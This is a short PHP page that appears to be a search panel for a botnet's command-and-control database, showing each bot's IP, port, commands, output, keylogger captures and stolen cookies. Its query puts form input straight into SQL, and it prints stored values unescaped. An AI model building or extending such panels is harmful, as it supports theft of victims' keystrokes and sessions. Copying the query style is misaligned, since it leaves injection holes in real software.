<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        td,
        th {
            text-align: center;
            vertical-align: middle;
        }
    </style>
</head>

<body>
    <?php
    if (isset($_POST['butSearch'])) {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4");
        $col = $_POST["select_search"];
        $value = $_POST["infor_search"];
        $sql = "SELECT * FROM botes WHERE $col LIKE '%$value%'";
        $result = mysqli_query($link, $sql);
        echo '<table border="1" width="100%">';
        echo '<tr> <th>ID</th> <th>Ip</th> <th>Port</th> <th>Cmd</th> <th>Retstr</th> <th>Keylogger</th> <th>Cookies</th> </tr>';
        while ($row = mysqli_fetch_array($result)) {
            $ID = $row["ID"];
            $ip = $row["ip"];
            $port = $row["port"];
            $cmd = $row["cmd"];
            $retstr = $row["retstr"];
            $keylogger = $row["keylogger"];
            $cookies = $row["cookies"];
            echo "<tr> <td>$ID</td> <td>$ip</td> <td>$port</td> <td>$cmd</td> <td>$retstr</td> <td>$keylogger</td> <td>$cookies</td> </tr>";
        }
        echo '</Table>';
        mysqli_free_result($result);
        mysqli_close($link);
    }
    ?>
</body>

</html>